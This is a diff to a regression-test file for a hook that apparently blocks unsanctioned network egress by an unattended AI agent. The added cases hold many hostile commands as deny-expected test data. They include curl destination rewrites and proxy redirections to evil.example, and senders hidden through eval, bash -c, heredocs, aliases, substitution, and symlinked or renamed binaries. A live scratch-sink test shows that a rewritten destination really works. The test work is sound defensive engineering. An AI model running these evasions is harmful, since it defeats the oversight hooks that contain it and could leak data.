@@ -23,8 +23,13 @@ the other. That division is the whole lesson of the incident above.
 
 import json
 import os
+import shlex
+import shutil
 import subprocess
 import sys
+import tempfile
+import threading
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 GUARD = os.path.join(REPO, "hooks", "guard-unattended.py")
@@ -79,6 +84,191 @@ def case(name, payload, expect):
 
 
 # ── 1. KNOWN_HOSTS: the code list still works, including today's additions ────
+# Local inference uses the sanctioned flash-run ask transport, which pins its
+# origin and disables proxies and redirects. A URL cannot vouch for curl,
+# wget or an interpreter's effective destination, even on a model port.
+for host in ("127.0.0.1", "localhost", "[::1]"):
+    for port in (8000, 8596):
+        case(f"local model {host}:{port}",
+             bash(f"curl -X POST http://{host}:{port}/v1/chat/completions -d '{{}}'"), DENY)
+    for port in (22, 80, 443, 5432, 8001, 8597):
+        case(f"deny other loopback port {host}:{port}",
+             bash(f"curl http://{host}:{port}/"), DENY)
+    case(f"deny implicit loopback port {host}", bash(f"curl http://{host}/"), DENY)
+    case(f"deny mixed local ports {host}",
+         bash(f"curl http://{host}:8000/ http://{host}:5432/"), DENY)
+    case(f"deny malformed local port {host}", bash(f"curl http://{host}:oops/"), DENY)
+for host in ("127.0.0.2", "localhost.evil.example", "evil.localhost", "[::2]"):
+    case(f"deny near-loopback {host}", bash(f"curl http://{host}:8000/"), DENY)
+case("local model plus unknown remote still denied",
+     bash("curl http://127.0.0.1:8000/ https://unknown-egress.example/"), DENY)
+case("local model interpreter send",
+     bash('python3 -c "import urllib.request; urllib.request.urlopen(\'http://127.0.0.1:8000/v1/models\')"'), DENY)
+case("sanctioned local model ask", bash("python3 tools/flash-run.py ask ping --json-object"), ALLOW)
+case("sanctioned ask with inert URL in question",
+     bash("python3 tools/flash-run.py ask 'Describe http://127.0.0.1:8000/'"), ALLOW)
+for escape in (
+    "curl --connect-to 127.0.0.1:8000:evil.example:443 http://127.0.0.1:8000/",
+    "curl --resolve localhost:8000:203.0.113.9 http://localhost:8000/",
+    "curl --noproxy '' --proxy socks5h://evil.example:9999 http://127.0.0.1:8000/",
+    "curl --proxy socks5://evil.example:9999 http://127.0.0.1:8000/",
+    "curl --proxy evil.example:9999 http://127.0.0.1:8000/",
+    "curl -x evil.example:9999 http://127.0.0.1:8000/",
+    "curl --preproxy socks5://evil.example:9999 http://127.0.0.1:8000/",
+    "curl -L http://127.0.0.1:8000/",
+    "curl --location http://127.0.0.1:8000/",
+    "curl --location-trusted http://127.0.0.1:8000/",
+    "curl --config /tmp/curl-destination.conf http://127.0.0.1:8000/",
+    "wget http://localhost:8000/",
+):
+    case(f"deny local transport escape: {escape}", bash(escape), DENY)
+for variable in ("http_proxy", "https_proxy", "all_proxy", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY"):
+    for prefix in ("", "env ", "echo ready && "):
+        case(f"deny proxy assignment {prefix}{variable}",
+             bash(f"{prefix}{variable}=socks5h://evil.example:9999 curl http://localhost:8000/"), DENY)
+case("deny quoted proxy assignment with another env value",
+     bash("MODE=test http_proxy='http://evil.example:9999' /usr/bin/curl http://localhost:8000/"), DENY)
+case("deny assignment-prefixed remote sender",
+     bash("MODE=test curl https://unknown-egress.example/"), DENY)
+case("assignment-prefixed prose stays inert",
+     bash("MODE=test echo 'curl http://localhost:8000/'"), ALLOW)
+case("long assignment without a sender stays inert",
+     bash("MODE=" + "a" * 20000), ALLOW)
+case("long assignment before an inert command stays inert",
+     bash("MODE=" + "a" * 20000 + " echo ready"), ALLOW)
+
+# The adversarial re-review at dda25ef9: shell interpretation must not hide a
+# sender from the hook. These commands are evaluated, never sent remotely.
+for command in (
+    "eval 'curl http://localhost:8000/'",
+    "bash <<< 'curl http://localhost:8000/'",
+    "alias sender=curl; eval 'sender http://localhost:8000/'",
+    "python3 tools/flash-run.py ask --help && eval 'curl http://localhost:8000/'",
+    "command curl http://localhost:8000/",
+    "eval 'echo safe'", "alias harmless=echo",
+    "env -i curl http://localhost:8000/",
+):
+    case(f"deny review indirection: {command}", bash(command), DENY)
+for shell in ("bash", "sh", "zsh", "/bin/bash", "/bin/sh", "/bin/zsh"):
+    for command in (
+        f"{shell} -c 'curl http://localhost:8000/'",
+        f"{shell} -lc 'echo https://api.doctorcre.com/'",
+        f"{shell} -c 'cu\"\"rl http://localhost:8000/'",
+        f"{shell} <<< 'echo inert'",
+        f"{shell} <<'EOF'\necho inert\nEOF",
+        f"<<EOF {shell}\necho inert\nEOF",
+    ):
+        case(f"deny interpreted shell input: {command}", bash(command), DENY)
+    case(f"ordinary {shell} -c repo command", bash(f"{shell} -c 'git status'"), ALLOW)
+for prefix in ("command", "exec", "builtin", "command exec", "exec command", "command -p", "exec -a sender", "exec -ca sender"):
+    case(f"deny resolved prefix {prefix}", bash(f"{prefix} curl http://localhost:8000/"), DENY)
+    case(f"ordinary resolved prefix {prefix}", bash(f"{prefix} git status"), ALLOW)
+case("quoted command names remain data", bash("echo 'eval alias bash <<< curl http://localhost:8000/'"), ALLOW)
+case("quoted ask command remains data", bash("python3 tools/flash-run.py ask 'eval curl http://localhost:8000/'"), ALLOW)
+case("python stdin heredoc is refused by static-resolution policy",
+     bash("python3 <<'EOF'\nprint('hello')\nEOF"), DENY)
+case("escaped quotes in repo prose remain data",
+     bash('gh pr comment 1425 --body "Use \\"quoted\\" names and eval in prose"'), ALLOW)
+case("literal variable sender is resolved", bash("sender=curl; $sender http://localhost:8000/"), DENY)
+case("literal variable repo command remains allowed", bash("tool=/usr/bin/git; $tool status http://localhost:8000/"), ALLOW)
+for wrapper in ("if true; then %s; fi", "{ %s; }", "f() { %s; }; f", "! %s",
+                "for item in one; do %s; done", "while %s; do break; done"):
+    for operation in ("eval 'curl http://localhost:8000/'", "alias sender=curl"):
+        command = wrapper % operation
+        case(f"deny grouped shell indirection: {command}", bash(command), DENY)
+    case(f"ordinary grouped repo command: {wrapper}", bash(wrapper % "git status"), ALLOW)
+for command in (
+    'echo "$(eval \'curl http://localhost:8000/\')"',
+    'echo "`eval \'curl http://localhost:8000/\'`"',
+    'echo "$(alias sender=curl)"',
+):
+    case(f"deny substituted shell indirection: {command}", bash(command), DENY)
+case("single-quoted substitution remains data",
+     bash("echo '$(eval curl http://localhost:8000/)'"), ALLOW)
+case("ordinary substituted repo command", bash('echo "$(git rev-parse HEAD)"'), ALLOW)
+for command in (
+    "bash -o errexit -c 'curl http://localhost:8000/'",
+    "2>/dev/null command curl http://localhost:8000/",
+    "2>/dev/null bash <<< 'curl http://localhost:8000/'",
+    "2>&1 eval 'curl http://localhost:8000/'",
+):
+    case(f"deny option/redirection indirection: {command}", bash(command), DENY)
+
+
+def executable_identity_regressions(directory):
+    """Keep the path fixtures alive until the real hook processes each case."""
+    for sender in ("curl", "wget", "nc"):
+        executable = shutil.which(sender)
+        if not executable:
+            continue  # wget is optional on macOS; Linux CI exercises it.
+        link = os.path.join(directory, f"link-{sender}")
+        chain = os.path.join(directory, f"chain-{sender}")
+        renamed = os.path.join(directory, f"renamed-{sender}")
+        os.symlink(executable, link)
+        os.symlink(link, chain)
+        shutil.copyfile(os.path.realpath(executable), renamed)
+        os.chmod(renamed, 0o755)
+        for path in (executable, os.path.realpath(executable), link, chain, renamed):
+            case(f"deny {sender} executable identity {path}",
+                 bash(f"{shlex.quote(path)} http://localhost:8000/"), DENY)
+        case(f"deny prefixed renamed {sender}",
+             bash(f"command exec {shlex.quote(renamed)} http://localhost:8000/"), DENY)
+        case(f"deny relative symlink after cd -- for {sender}",
+             bash(f"cd -- {shlex.quote(directory)} && ./chain-{sender} http://localhost:8000/"), DENY)
+        case(f"deny substituted renamed {sender}",
+             bash(f'echo "$({shlex.quote(renamed)} http://localhost:8000/)"'), DENY)
+        for prefix in ("command", "exec", "builtin"):
+            collision = os.path.join(directory, f"collision-{len(CASES)}", prefix)
+            os.makedirs(os.path.dirname(collision), exist_ok=True)
+            shutil.copyfile(os.path.realpath(executable), collision)
+            os.chmod(collision, 0o755)
+            case(f"deny {sender} copy named {prefix}",
+                 bash(f"{shlex.quote(collision)} http://localhost:8000/"), DENY)
+
+
+def scratch_sink_regression():
+    """Prove URL port 8000 can reach another port, then demand hook denial."""
+    hits = []
+    class Sink(BaseHTTPRequestHandler):
+        def do_GET(self):
+            hits.append(self.path)
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"SCRATCH_SINK")
+
+        def log_message(self, *args):
+            pass
+
+    with ThreadingHTTPServer(("127.0.0.1", 0), Sink) as server:
+        thread = threading.Thread(target=server.serve_forever, daemon=True)
+        thread.start()
+        try:
+            argv = ["curl", "--silent", "--show-error", "--max-time", "5", "--noproxy", "*",
+                    "--connect-to", f"127.0.0.1:8000:127.0.0.1:{server.server_port}",
+                    "http://127.0.0.1:8000/proof"]
+            result = subprocess.run(argv, capture_output=True, text=True, timeout=10)
+            if result.returncode != 0 or result.stdout != "SCRATCH_SINK" or hits != ["/proof"]:
+                raise AssertionError(f"scratch-sink reproduction failed: {result.returncode}, {hits}")
+            case("deny live scratch-sink destination rewrite", bash(shlex.join(argv)), DENY)
+            sender = shlex.join(argv)
+            for command in (
+                "eval " + shlex.quote(sender),
+                "bash <<< " + shlex.quote(sender),
+                "alias sender=curl; eval " + shlex.quote("sender " + shlex.join(argv[1:])),
+                "python3 tools/flash-run.py ask --help && eval " + shlex.quote(sender),
+                "bash -c " + shlex.quote(sender),
+                "command " + sender, "exec " + sender, "builtin " + sender,
+                'MODE="$(echo inert)" ' + sender,
+                "printf '%s\\n' " + shlex.quote(sender) + " | bash",
+                "python3 tools/flash-run.py ask --help && printf '%s\\n' " + shlex.quote(sender) + " | bash",
+                "bash < <(printf '%s\\n' " + shlex.quote(sender) + ")",
+                "env -S " + shlex.quote(sender),
+            ):
+                case(f"deny scratch-sink indirection {command}", bash(command), DENY)
+        finally:
+            server.shutdown()
+            thread.join(timeout=5)
+
 for h in ("https://npiregistry.cms.hhs.gov/api/?version=2.1",
           "https://search.sunbiz.org/Inquiry/CorporationSearch/ByName",
           "https://chiro.alabama.gov/",
@@ -642,7 +832,8 @@ for _cmd in (
     case(f"replay sample: {_cmd!r} is allowed", bash(_cmd, cwd=WORKTREE), ALLOW)
 
 
-def main():
+def run_cases():
+    scratch_sink_regression()
     verbose = "-v" in sys.argv[1:]
     fails = []
     for name, payload, expect in CASES:
@@ -664,6 +855,12 @@ def main():
         print("FAILED: " + "; ".join(fails))
         return 1
     return 0
+
+
+def main():
+    with tempfile.TemporaryDirectory(prefix="guard-sender-") as directory:
+        executable_identity_regressions(directory)
+        return run_cases()
 
 
 if __name__ == "__main__":
